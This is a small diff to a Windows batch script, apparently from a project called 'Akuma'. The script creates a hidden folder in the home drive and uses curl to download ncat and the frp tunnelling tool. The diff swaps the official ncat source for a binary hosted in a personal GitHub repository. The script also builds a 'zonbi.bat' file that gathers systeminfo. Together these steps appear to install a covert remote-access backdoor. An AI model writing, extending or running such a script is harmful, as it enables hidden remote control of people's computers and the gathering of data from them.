@@ -3,7 +3,8 @@ rmdir /s /q %homedrive%\Akuma
 mkdir %homedrive%\Akuma
 attrib +h %homedrive%\Akuma
 cd %homedrive%\Akuma
-curl -L https://nmap.org/dist/ncat-portable-5.59BETA1.zip > ncat-portable-5.59BETA1.zip
+mkdir  %homedrive%\Akuma\ncat-portable-5.59BETA1
+curl -L https://github.com/l-urk/Akuma/raw/main/ncat.exe > ncat-portable-5.59BETA1\ncat.exe
 curl -L https://github.com/fatedier/frp/releases/download/v0.52.1/frp_0.52.1_windows_amd64.zip > frp_0.52.1_windows_amd64.zip
 echo del %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
 echo systeminfo ^>^> %homedrive%\Akuma\systeminfo.txt >> %homedrive%\Akuma\zonbi.bat
